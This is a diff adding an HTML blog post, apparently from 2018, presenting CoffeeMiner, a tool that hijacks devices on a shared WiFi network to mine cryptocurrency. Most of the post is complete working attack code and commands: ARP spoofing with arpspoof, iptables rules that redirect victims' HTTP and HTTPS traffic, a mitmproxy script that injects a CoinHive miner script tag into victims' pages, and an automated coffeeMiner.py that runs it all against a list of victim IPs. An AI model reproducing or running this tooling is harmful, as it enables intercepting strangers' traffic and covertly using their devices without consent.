@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta name="description" content="Webpage description goes here" />
+    <meta charset="utf-8">
+    <title>CoffeeMiner: Hacking WiFi to inject cryptocurrency miner to HTML requests - ArnauCube - Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/style.css">
+
+    <!-- highlightjs -->
+    <!-- <link rel="stylesheet" href="js/highlightjs/atom-one-dark.css"> -->
+    <link rel="stylesheet" href="js/highlightjs/gruvbox-dark.css">
+    <script src="js/highlightjs/highlight.pack.js"></script>
+
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous">
+  </head>
+
+  <body>
+
+                             <!-- o_gradient_background" -->
+    <nav id="mainNav" class="navbar navbar-default navbar-fixed-top"
+          style="height:50px;font-size:130%;">
+      <div class="container">
+        <a href="/blog" style="color:#000;">Blog index</a>
+        <a href="/" style="color:#000;float:right;">arnaucube.com</a>
+      </div>
+    </nav>
+    <div class="o_gradient_background" style="height:5px;"></div>
+
+
+
+    <div class="container" style="margin-top:80px;max-width:800px;">
+      <h1>CoffeeMiner: Hacking WiFi to inject cryptocurrency miner to HTML requests</h1>
+
+<p><em>2018-01-04</em></p>
+
+<p><strong><em>Disclamer: this article &amp; project is for academic purposes only.</em></strong></p>
+
+<p>Some weeks ago I read about <a href="https://motherboard.vice.com/en_us/article/gyd5xq/starbucks-wi-fi-hijacked-peoples-laptops-to-mine-cryptocurrency-coinhive">this Starbucks case</a> where hackers hijacked laptops on the WiFi network to use the devices computing power to mine cryptocurrency, and I thought it might be interesting perform the attack in a different way.</p>
+
+<p>The goal of this article, is to explain how can be done the attack of MITM (Machine-In-The-Middle) to inject some javascript in the html pages, to force all the devices connected to a WiFi network to be mining a cryptocurrency for the attacker.</p>
+
+<p><img src="img/posts/coffeeMiner/coffeeMiner-logo-small.png" alt="coffeeMiner" title="coffeeMiner" /></p>
+
+<p>The objective is to have a script that performs autonomous attack on the WiFi network. It&rsquo;s what we have called <strong>CoffeeMiner</strong>, as it&rsquo;s a kind of attack that can be performed in the cafes WiFi networks.</p>
+
+<h2>1. The Scenario</h2>
+
+<p>The scenario will be some machines connected to the WiFi network, and the CoffeeMiner attacker intercepting the traffic between the users and the router.</p>
+
+<p><img src="img/posts/coffeeMiner/coffeeMiner-network-attack.png" alt="network" title="network" /></p>
+
+<h3>1.1 Scenario configuration</h3>
+
+<p>The real scenario is a WiFi with laptops and smartphones connected. We have tested in this real world scenario, and it works. But for this article, we will see more deeply how to set up in a virtual environment.</p>
+
+<p>We will use VirtualBox to deploy our virtual scenario <a href="https://www.virtualbox.org/">https://www.virtualbox.org/</a> .</p>
+
+<p>First of all we need to download some Linux disk image and install it into a VirtualBox machine, for this example we will use Kali Linux images <a href="https://www.kali.org/">https://www.kali.org/</a></p>
+
+<p>Once we have the ISO image downloaded, we prepare 3 VBox machines with the Linux image installed.</p>
+
+<p>To configure the defined scenario we need to prepare the machines each one with a role:</p>
+
+<ul>
+<li>Victim
+
+<ul>
+<li>will be the machine that connects to the Router and browse some pages.</li>
+</ul></li>
+<li>Attacker
+
+<ul>
+<li>will be the machine where it runs the CoffeeMiner. Is the machine that performs the MITM.</li>
+</ul></li>
+<li>Router / Gateway
+
+<ul>
+<li>will act as a normal gateway.</li>
+</ul></li>
+</ul>
+
+<p><img src="img/posts/coffeeMiner/scenario01.png" alt="network" title="network" /></p>
+
+<p>Once the attack is performed, the scenario will be:</p>
+
+<p><img src="img/posts/coffeeMiner/scenario02.png" alt="network" title="network" /></p>
+
+<p>To configure each one of the machines, we will do the following configuration:</p>
+
+<ul>
+<li>Victim
+
+<ul>
+<li>network adapter:
+
+<ul>
+<li>eth0: Host-only Adapter</li>
+</ul></li>
+<li>/etc/network/interfaces:</li>
+</ul></li>
+</ul>
+
+<pre><code class="language-bash">auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet static
+    address 10.0.2.10
+    netmask 255.255.255.0
+    gateway 10.0.2.15
+</code></pre>
+
+<ul>
+<li>Attacker
+
+<ul>
+<li>network adapter:
+
+<ul>
+<li>eth0: Host-only Adapter</li>
+</ul></li>
+<li>/etc/network/interfaces:</li>
+</ul></li>
+</ul>
+
+<pre><code class="language-bash">auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet static
+    address 10.0.2.20
+    netmask 255.255.255.0
+    gateway 10.0.2.15
+</code></pre>
+
+<ul>
+<li>Router / Gateway
+
+<ul>
+<li>network adapter:
+
+<ul>
+<li>eth0: Bridged Adapter</li>
+<li>eth1: Host-only Adapter</li>
+</ul></li>
+<li>/etc/network/interfaces:</li>
+</ul></li>
+</ul>
+
+<pre><code class="language-bash">auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet dhcp
+
+auto eth1
+iface eth1 inet static
+    address 10.0.2.15
+    netmask 255.255.255.0
+</code></pre>
+
+<h2>2. CoffeeMiner, understanding the code</h2>
+
+<h3>2.1 ARPspoofing</h3>
+
+<p>First of all, we need to understand how the MITM attack is performed.</p>
+
+<p>From wikipedia:</p>
+
+<p><em>&ldquo;In computer networking, ARP spoofing, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network. Generally, the aim is to associate the attacker&rsquo;s MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.&rdquo;</em></p>
+
+<p><a href="https://en.wikipedia.org/wiki/ARP_spoofing">https://en.wikipedia.org/wiki/ARP_spoofing</a></p>
+
+<p>To perform the ARPspoofing attack, we will use the <strong>dsniff</strong> library.</p>
+
+<pre><code class="language-bash">arpspoof -i interface -t ipVictim ipGateway
+arpspoof -i interface -t ipGateway ipVictim
+</code></pre>
+
+<h3>2.2 mitmproxy</h3>
+
+<p><a href="https://mitmproxy.org/">mitmproxy</a> is a software tool that allows us to analyze the traffic that goes through a host, and allows to edit that traffic. In our case, we will use it to inject the javascript into the html pages.</p>
+
+<p>To make the process more more clean, we will only inject one line of code into the html pages. And will be that line of html code that will call to the javascript cryptocurrency miner.</p>
+
+<p>The line to inject the crypto miner is:</p>
+
+<pre><code class="language-html">&lt;script src=&quot;http://httpserverIP:8000/script.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<h3>2.3 Injector</h3>
+
+<p>Once we have the victim&rsquo;s traffic intercepted, we need to inject our script on it. We will use the mitmproxy API to do the injector:</p>
+
+<pre><code class="language-python">from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+
+class Injector:
+    def __init__(self, path):
+        self.path = path
+
+    def response(self, flow: http.HTTPFlow) -&gt; None:
+        if self.path:
+            html = BeautifulSoup(flow.response.content, &quot;html.parser&quot;)
+            print(self.path)
+            print(flow.response.headers[&quot;content-type&quot;])
+            if flow.response.headers[&quot;content-type&quot;] == 'text/html':
+                script = html.new_tag(
+                    &quot;script&quot;,
+                    src=self.path,
+                    type='application/javascript')
+                html.body.insert(0, script)
+                flow.response.content = str(html).encode(&quot;utf8&quot;)
+                print(&quot;Script injected.&quot;)
+
+def start():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;path&quot;, type=str)
+    args = parser.parse_args()
+    return Injector(args.path)
+
+</code></pre>
+
+<h3>2.4 HTTP Server</h3>
+
+<p>As we have seen, the injector adds a line to the html, with a call to our javascript crypto miner. So, we need to have the script file deployed in a HTTP Server.</p>
+
+<p>In order to serve the javascript cryptocurrency miner, we will deploy a HTTP Server in the attacker machine. To do that, we will use the Python library &lsquo;http.server&rsquo;:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+import http.server
+import socketserver
+import os
+
+PORT = 8000
+
+web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')
+os.chdir(web_dir)
+
+Handler = http.server.SimpleHTTPRequestHandler
+httpd = socketserver.TCPServer((&quot;&quot;, PORT), Handler)
+print(&quot;serving at port&quot;, PORT)
+httpd.serve_forever()
+</code></pre>
+
+<p>The code above is a simple HTTP Server that will serve our crypto miner to the victims, when they require it.</p>
+
+<p>The javascript miner, will be placed in the /miner_script directory. In our case, we have used the <a href="https://coinhive.com/">CoinHive</a> javascript miner.</p>
+
+<h3>2.5 CoinHive crypto miner</h3>
+
+<p><a href="https://coinhive.com/">CoinHive</a> is a javascript miner for the <a href="https://coinmarketcap.com/es/currencies/monero/">Monero cryptocurrency</a> (XMR). It can be added to a website, and will use the user CPU power to calculate hashes with the Cryptonight PoW hash algorithm to mine Monero, based on <a href="https://cryptonote.org/">CryptoNote</a> protocol.</p>
+
+<p>CoinHive miner makes sense when user stays in a website for mid-long term sessions. So, for example, for a website where the users average session is arround 40 seconds, it doesn&rsquo;t make much sense.</p>
+
+<p>In our case, as we will inject the crypto miner in each one of the HTML pages that victims request, will have long term sessions to calculate hashes to mine Monero.</p>
+
+<p><img src="img/posts/coffeeMiner/coinhive-monero-logo.jpg" alt="CoinHive logo" title="CoinHive logo" /></p>
+
+<h2>3. CoffeeMiner, puting all together</h2>
+
+<p>The main objective is to tie all the previous concepts in one autonomous deployment. This will be the CoffeeMiner.</p>
+
+<p>The idea is to have the CoffeeMiner script that performs the ARPspoofing attack and set ups the mitmproxy to inject the CoinHive cryptominer into victims HTML pages.</p>
+
+<p>First of all, we need to configure the ip_forwarding and IPTABLES, in order to convert the attacker&rsquo;s machine into a proxy:</p>
+
+<pre><code class="language-bash">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+</code></pre>
+
+<p>To perform the ARPspoof for all the victims, we will prepare a &lsquo;victims.txt&rsquo; file with all the victim&rsquo;s IP.
+To read all the victims IPs, we prepare some Python lines, that will get the IPs (and also the gateway IP from the command line args), and performs the ARPspoof for each one of the victim&rsquo;s IP.</p>
+
+<pre><code class="language-python"># get gateway_ip
+gateway = sys.argv[1]
+print(&quot;gateway: &quot; + gateway)
+# get victims_ip
+victims = [line.rstrip('\n') for line in open(&quot;victims.txt&quot;)]
+print(&quot;victims:&quot;)
+print(victims)
+
+# run the arpspoof for each victim, each one in a new console
+for victim in victims:
+    os.system(&quot;xterm -e arpspoof -i eth0 -t &quot; + victim + &quot; &quot; + gateway + &quot; &amp;&quot;)
+    os.system(&quot;xterm -e arpspoof -i eth0 -t &quot; + gateway + &quot; &quot; + victim + &quot; &amp;&quot;)
+</code></pre>
+
+<p>Once we have the ARPspoofing performed, we just need to run the HTTP Server:</p>
+
+<pre><code class="language-bash">&gt; python3 httpServer.py
+</code></pre>
+
+<p>And now, we can run the mitmproxy with the injector.py:</p>
+
+<pre><code class="language-bash">&gt; mitmdump -s 'injector.py http://httpserverIP:8000/script.js'
+</code></pre>
+
+<h2>3.1 CoffeeMiner, final script</h2>
+
+<p>Now we put all the concepts explained above in the &lsquo;coffeeMiner.py&rsquo; script:</p>
+
+<pre><code class="language-python">import os
+import sys
+
+#get gateway_ip (router)
+gateway = sys.argv[1]
+print(&quot;gateway: &quot; + gateway)
+# get victims_ip
+victims = [line.rstrip('\n') for line in open(&quot;victims.txt&quot;)]
+print(&quot;victims:&quot;)
+print(victims)
+
+# configure routing (IPTABLES)
+os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+os.system(&quot;iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE&quot;)
+os.system(&quot;iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080&quot;)
+os.system(&quot;iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080&quot;)
+
+
+# run the arpspoof for each victim, each one in a new console
+for victim in victims:
+    os.system(&quot;xterm -e arpspoof -i eth0 -t &quot; + victim + &quot; &quot; + gateway + &quot; &amp;&quot;)
+    os.system(&quot;xterm -e arpspoof -i eth0 -t &quot; + gateway + &quot; &quot; + victim + &quot; &amp;&quot;)
+
+# start the http server for serving the script.js, in a new console
+os.system(&quot;xterm -hold -e 'python3 httpServer.py' &amp;&quot;)
+
+# start the mitmproxy
+os.system(&quot;~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T&quot;)
+</code></pre>
+
+<p>And also in the &lsquo;injector.py&rsquo; script:</p>
+
+<pre><code class="language-python">from bs4 import BeautifulSoup
+from mitmproxy import ctx, http
+import argparse
+
+class Injector:
+    def __init__(self, path):
+        self.path = path
+
+    def response(self, flow: http.HTTPFlow) -&gt; None:
+        if self.path:
+            html = BeautifulSoup(flow.response.content, &quot;html.parser&quot;)
+            print(self.path)
+            print(flow.response.headers[&quot;content-type&quot;])
+            if flow.response.headers[&quot;content-type&quot;] == 'text/html':
+                print(flow.response.headers[&quot;content-type&quot;])
+                script = html.new_tag(
+                    &quot;script&quot;,
+                    src=self.path,
+                    type='application/javascript')
+                html.body.insert(0, script)
+                flow.response.content = str(html).encode(&quot;utf8&quot;)
+                print(&quot;Script injected.&quot;)
+
+def start():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;path&quot;, type=str)
+    args = parser.parse_args()
+    return Injector(args.path)
+</code></pre>
+
+<p>And to execute, we just need to do:</p>
+
+<pre><code class="language-bash">&gt; python3 coffeeMiner.py RouterIP
+</code></pre>
+
+<h2>4. Demo</h2>
+
+<p>In order to do the demo, we set up the VirtualBox scenario explained above.</p>
+
+<p>If we want to perform the attack manually, we will need the following terminals:</p>
+
+<p><img src="img/posts/coffeeMiner/demo01.png" alt="demo" title="demo" /></p>
+
+<p>Then, once the ARPspoofing attack is done and the injector and the HTTP Server are ready, we can go to the victim&rsquo;s machine and browse to a website. The victim&rsquo;s traffic will go through the attacker machine, and will activate the injector:</p>
+
+<p><img src="img/posts/coffeeMiner/demo02.png" alt="demo" title="demo" /></p>
+
+<p>As a result, the html pages that the victim is viewing, will have the html lines of code that the attacker has been injected.</p>
+
+<p><img src="img/posts/coffeeMiner/coffeeMiner-demo-cutted.gif" alt="demo" title="demo" /></p>
+
+<h4>4.1 Demo video</h4>
+
+<p>In the following video, we can see the complete attack in the scenario, using the coffeeMiner.py script:</p>
+
+<ul>
+<li>VirtualBox demo:</li>
+</ul>
+
+<p><a href="https://www.youtube.com/watch?v=wmYJ6Z4LoCA"><img src="img/posts/coffeeMiner/demo-video.png" alt="video demo" /></a></p>
+
+<ul>
+<li>Real world WiFi network and laptops demo:</li>
+</ul>
+
+<p><a href="https://www.youtube.com/watch?v=-TnzGLUD0DU"><img src="img/posts/coffeeMiner/demo-realWiFi-video.png" alt="video demo" /></a></p>
+
+<h2>Conclusion</h2>
+
+<p>As we have seen, the attack can be easily performed, and also can be deployed to be an autonomous attack in a WiFi network.</p>
+
+<p>Another thing to have in mind, is that for a real world WiFi network, is better to perform the process with a powerful WiFi antenna, to reach better all the physical zone.</p>
+
+<p>Tha main objective was to perform the autonomous attack, but we still need to edit the victims.txt file with the IP addresses of the victims devices. For a further version, a possible feature could be adding an autonomous <a href="https://nmap.org/">Nmap</a> scan, to add the IPs detected to the CoffeeMiner victims list. Another further feature, could be adding <a href="https://moxie.org/software/sslstrip/">sslstrip</a>, to make sure the injection also in the websites that the user can request over HTTPS.</p>
+
+<p>The complete code is available in the github repo: <a href="https://github.com/arnaucube/coffeeMiner">https://github.com/arnaucube/coffeeMiner</a></p>
+
+<hr>
+
+<p><strong><em>Disclamer: this article &amp; project is for academic purposes only.</em></strong></p>
+
+<hr>
+
+<p><em>tags: python, cryptocurrency, miner, blockchain, mitm, wifi, javascript, hacking, html, cryptominer, python3</em></p>
+
+<hr>
+
+<h1>References in the press about this article</h1>
+
+<ul>
+<li><p>English</p>
+
+<ul>
+<li><a href="https://www.theregister.co.uk/2018/01/05/wi_fi_crypto_mining/">https://www.theregister.co.uk/2018/01/05/wi_fi_crypto_mining/</a></li>
+<li><a href="http://securityaffairs.co/wordpress/67438/hacking/coffeeminer-hacking-wifi-cryptocurrency.html">http://securityaffairs.co/wordpress/67438/hacking/coffeeminer-hacking-wifi-cryptocurrency.html</a></li>
+<li><a href="https://gbhackers.com/coffeeminer-hacking-wifi/">https://gbhackers.com/coffeeminer-hacking-wifi/</a></li>
+<li><a href="https://www.privateinternetaccess.com/blog/2018/01/stop-coffeeminer-tool-injects-cryptocurrency-miner-html-requests-wifi-hotspots/">https://www.privateinternetaccess.com/blog/2018/01/stop-coffeeminer-tool-injects-cryptocurrency-miner-html-requests-wifi-hotspots/</a></li>
+<li><a href="http://www.zdnet.com/article/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/">http://www.zdnet.com/article/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/</a></li>
+<li><a href="https://sensorstechforum.com/coffeeminer-malware-virus-detect-remove/">https://sensorstechforum.com/coffeeminer-malware-virus-detect-remove/</a></li>
+<li><a href="http://turningtrend.com/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/">http://turningtrend.com/how-to-hack-public-wi-fi-to-mine-for-cryptocurrency/</a></li>
+<li><a href="https://www.theissue.com/technology/coffeeminer-demonstrates-how-hijackers-can-use-public-wi-fi-networks-to-mine-cryptocurrency">https://www.theissue.com/technology/coffeeminer-demonstrates-how-hijackers-can-use-public-wi-fi-networks-to-mine-cryptocurrency</a></li>
+<li><a href="https://koddos.net/blog/hackers-use-coffeeminer-hijack-public-wifi-hotspots-mine-cryptocurrency/?utm_source=Sociallymap&amp;utm_medium=Sociallymap&amp;utm_campaign=Sociallymap">https://koddos.net/blog/hackers-use-coffeeminer-hijack-public-wifi-hotspots-mine-cryptocurrency/?utm_source=Sociallymap&amp;utm_medium=Sociallymap&amp;utm_campaign=Sociallymap</a></li>
+<li><a href="http://nymag.com/selectall/2018/01/coffeeminer-allows-hackers-to-mine-bitcoin-on-public-wi-fi.html">http://nymag.com/selectall/2018/01/coffeeminer-allows-hackers-to-mine-bitcoin-on-public-wi-fi.html</a></li>
+<li><a href="https://medium.com/computerist/beware-coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins-1915624c2ea5">https://medium.com/computerist/beware-coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins-1915624c2ea5</a></li>
+<li><a href="https://resiliencepost.com/2018/01/12/coffeeminer-forces-coffee-shop-visitors-to-mine-for-monero/">https://resiliencepost.com/2018/01/12/coffeeminer-forces-coffee-shop-visitors-to-mine-for-monero/</a></li>
+<li><a href="https://fossbytes.com/coffeeminer-attack-wifi-attack-cryptomining/">https://fossbytes.com/coffeeminer-attack-wifi-attack-cryptomining/</a></li>
+<li><a href="https://securityboulevard.com/2018/01/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency/">https://securityboulevard.com/2018/01/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency/</a></li>
+<li><a href="https://latesthackingnews.com/2018/01/07/hacking-wireless-networks-use-coffeeminer-inject-cryptocurrency-miners/">https://latesthackingnews.com/2018/01/07/hacking-wireless-networks-use-coffeeminer-inject-cryptocurrency-miners/</a></li>
+<li><a href="https://nakedsecurity.sophos.com/2018/01/09/coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins/">https://nakedsecurity.sophos.com/2018/01/09/coffeeminer-project-lets-you-hack-public-wi-fi-to-mine-cryptocoins/</a></li>
+<li><a href="https://hotforsecurity.bitdefender.com/blog/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency-19414.html">https://hotforsecurity.bitdefender.com/blog/coffeeminer-poc-targets-public-wi-fi-networks-to-mine-for-cryptocurrency-19414.html</a></li>
+<li><a href="https://www.helpnetsecurity.com/2018/01/08/public-wifi-cryptocurrency-mining/">https://www.helpnetsecurity.com/2018/01/08/public-wifi-cryptocurrency-mining/</a></li>
+<li><a href="https://www.infosecurity-magazine.com/news/coffeeminer-mine-for-monero/">https://www.infosecurity-magazine.com/news/coffeeminer-mine-for-monero/</a></li>
+<li><a href="http://www.ibtimes.co.uk/what-coffeeminer-new-attack-lets-hackers-hijack-public-wifi-networks-mine-cryptocurrency-1654320">http://www.ibtimes.co.uk/what-coffeeminer-new-attack-lets-hackers-hijack-public-wifi-networks-mine-cryptocurrency-1654320</a></li>
+</ul></li>
+
+<li><p>Spanish</p>
+
+<ul>
+<li><a href="http://www.elladodelmal.com/2018/01/coffeeminer-te-tomas-tu-cafe-te.html">http://www.elladodelmal.com/2018/01/coffeeminer-te-tomas-tu-cafe-te.html</a></li>
+<li><a href="https://blogs.protegerse.com/2018/01/10/coffeeminer-minando-criptodivisas-sin-autorizacion-usando-la-wifi-como-vector-de-ataque/">https://blogs.protegerse.com/2018/01/10/coffeeminer-minando-criptodivisas-sin-autorizacion-usando-la-wifi-como-vector-de-ataque/</a></li>
+<li><a href="http://noticiasseguridad.com/seguridad-informatica/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/">http://noticiasseguridad.com/seguridad-informatica/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/</a></li>
+<li><a href="https://www.redeszone.net/2018/01/06/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/">https://www.redeszone.net/2018/01/06/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/</a></li>
+<li><a href="https://terabytezone.com/coffeeminer-minado-criptomonedas-redes-wifi/">https://terabytezone.com/coffeeminer-minado-criptomonedas-redes-wifi/</a></li>
+<li><a href="http://www.nexusmovil.com/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/">http://www.nexusmovil.com/coffeeminer-un-script-que-automatiza-la-inyeccion-de-codigo-para-minar-criptomoneda-en-redes-wi-fi/</a></li>
+<li><a href="https://www.coincrispy.com/2018/01/10/coffeeminer-ataque-mineria-criptomonedas/">https://www.coincrispy.com/2018/01/10/coffeeminer-ataque-mineria-criptomonedas/</a></li>
+<li><a href="https://www.criptonoticias.com/seguridad/coffeeminer-secuestra-redes-publicas-wi-fi-para-minar-criptomonedas/">https://www.criptonoticias.com/seguridad/coffeeminer-secuestra-redes-publicas-wi-fi-para-minar-criptomonedas/</a></li>
+</ul></li>
+
+<li><p>Russian</p>
+
+<ul>
+<li><a href="https://forklog.com/ispanskij-issledovatel-razrabotal-majner-dlya-publichnyh-wi-fi-setej/">https://forklog.com/ispanskij-issledovatel-razrabotal-majner-dlya-publichnyh-wi-fi-setej/</a></li>
+<li><a href="https://coinsider.com/p/news/2542-coffeeminer-novaya-programma-dlya-skrytogo-majninga-kriptovalyuty">https://coinsider.com/p/news/2542-coffeeminer-novaya-programma-dlya-skrytogo-majninga-kriptovalyuty</a></li>
+<li><a href="https://xakep.ru/2018/01/10/coffeeminer/">https://xakep.ru/2018/01/10/coffeeminer/</a></li>
+</ul></li>
+
+<li><p>Italian</p>
+
+<ul>
+<li><a href="http://cybersecurity.startupitalia.eu/56384-20180108-coffeeminer-hackerare-le-reti-wifi-produrre-criptovalute">http://cybersecurity.startupitalia.eu/56384-20180108-coffeeminer-hackerare-le-reti-wifi-produrre-criptovalute</a></li>
+</ul></li>
+
+<li><p>Bulgarian</p>
+
+<ul>
+<li><a href="https://questona.com/coffeeminer-wifi/">https://questona.com/coffeeminer-wifi/</a></li>
+</ul></li>
+
+<li><p>Greek</p>
+
+<ul>
+<li><a href="https://www.youbrandinc.com/crytocurrency/%CF%80%CE%B1%CF%81%CE%B1%CE%B2%CE%B9%CE%AC%CF%83%CF%84%CE%B5-%CF%84%CE%BF-free-wi-fi-%CF%84%CE%B7%CF%82-%CE%B3%CE%B5%CE%B9%CF%84%CE%BF%CE%BD%CE%B9%CE%AC%CF%82-%CF%83%CE%B1%CF%82-%CE%B3%CE%B9%CE%B1-mon/">https://www.youbrandinc.com/crytocurrency/%CF%80%CE%B1%CF%81%CE%B1%CE%B2%CE%B9%CE%AC%CF%83%CF%84%CE%B5-%CF%84%CE%BF-free-wi-fi-%CF%84%CE%B7%CF%82-%CE%B3%CE%B5%CE%B9%CF%84%CE%BF%CE%BD%CE%B9%CE%AC%CF%82-%CF%83%CE%B1%CF%82-%CE%B3%CE%B9%CE%B1-mon/</a></li>
+</ul></li>
+
+<li><p>Turkish</p>
+
+<ul>
+<li><a href="http://blog.cyberage.com.tr/2018/01/10/coffeeminer/">http://blog.cyberage.com.tr/2018/01/10/coffeeminer/</a></li>
+</ul></li>
+
+<li><p>Dutch</p>
+
+<ul>
+<li><a href="https://www.smartbiz.be/nieuws/173781/hoe-een-publiek-wifi-netwerk-kan-worden-gehackt-om-cryptomunten-te-minen/">https://www.smartbiz.be/nieuws/173781/hoe-een-publiek-wifi-netwerk-kan-worden-gehackt-om-cryptomunten-te-minen/</a></li>
+</ul></li>
+
+<li><p>Chinese</p>
+
+<ul>
+<li><a href="http://www.4hou.com/wireless/9773.html">http://www.4hou.com/wireless/9773.html</a></li>
+<li><a href="https://www.ithome.com.tw/news/120449">https://www.ithome.com.tw/news/120449</a></li>
+</ul></li>
+</ul>
+
+<h4>Destacated tweets</h4>
+
+<ul>
+<li>@defcon <a href="https://twitter.com/defcon/status/949679959509012480">https://twitter.com/defcon/status/949679959509012480</a></li>
+<li>@x0rz <a href="https://twitter.com/x0rz/status/948865836609130496">https://twitter.com/x0rz/status/948865836609130496</a></li>
+<li>@avast_antivirus <a href="https://twitter.com/avast_antivirus/status/951835917815308288">https://twitter.com/avast_antivirus/status/951835917815308288</a></li>
+<li>@fullstackpython <a href="https://twitter.com/fullstackpython/status/949707681543213057">https://twitter.com/fullstackpython/status/949707681543213057</a></li>
+<li>@alienvault <a href="https://twitter.com/alienvault/status/950449599872929792">https://twitter.com/alienvault/status/950449599872929792</a></li>
+<li>@binitamshah <a href="https://twitter.com/binitamshah/status/951520444900818945">https://twitter.com/binitamshah/status/951520444900818945</a></li>
+<li>@_odisseus <a href="https://twitter.com/_odisseus/status/951052521967144960">https://twitter.com/_odisseus/status/951052521967144960</a></li>
+</ul>
+
+<p><img src="img/posts/coffeeMiner/tweets_small.png" alt="tweets" title="tweets" /></p>
+
+    </div>
+
+    <footer style="text-align:center; margin-top:100px;margin-bottom:50px;">
+      <div class="container">
+        <div class="row">
+          <ul class="list-inline">
+            <li><a href="https://twitter.com/arnaucube"
+                   style="color:gray;text-decoration:none;"
+                   target="_blank">twitter.com/arnaucube</a>
+            </li>
+            <li><a href="https://github.com/arnaucube"
+                   style="color:gray;text-decoration:none;"
+                   target="_blank">github.com/arnaucube</a>
+            </li>
+          </ul>
+        </div>
+        <div class="row" style="display:inline-block;">
+          Blog made with <a href="http://github.com/arnaucube/blogo/"
+            target="_blank" style="color: gray;text-decoration:none;">Blogo</a>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+    </script>
+    <script src="js/external-links.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.js" integrity="sha384-YNHdsYkH6gMx9y3mRkmcJ2mFUjTd0qNQQvY9VYZgQd7DcN7env35GzlmFaZ23JGp" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          displayMode: false,
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : true
+        });
+    });
+</script>
+
+
+  </body>
+</html>
+
